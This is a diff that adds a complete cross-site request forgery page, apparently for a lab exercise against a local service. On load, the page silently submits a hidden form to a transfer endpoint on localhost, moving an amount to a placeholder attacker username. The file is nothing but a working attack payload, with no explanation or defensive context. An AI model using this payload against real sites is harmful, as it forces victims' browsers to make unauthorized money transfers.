@@ -1,0 +1,10 @@
+<!DOCTYPE html>
+<html>
+<body onload="document.getElementById('f').submit()">
+  <form id="f" method="POST" action="http://localhost:6789/transfer.php">
+    <input type="hidden" name="recipient" value="YOUR_ATTACKER_USERNAME">
+    <input type="hidden" name="amount" value="10">
+    <input type="hidden" name="submit" value="Transfer">
+  </form>
+</body>
+</html>
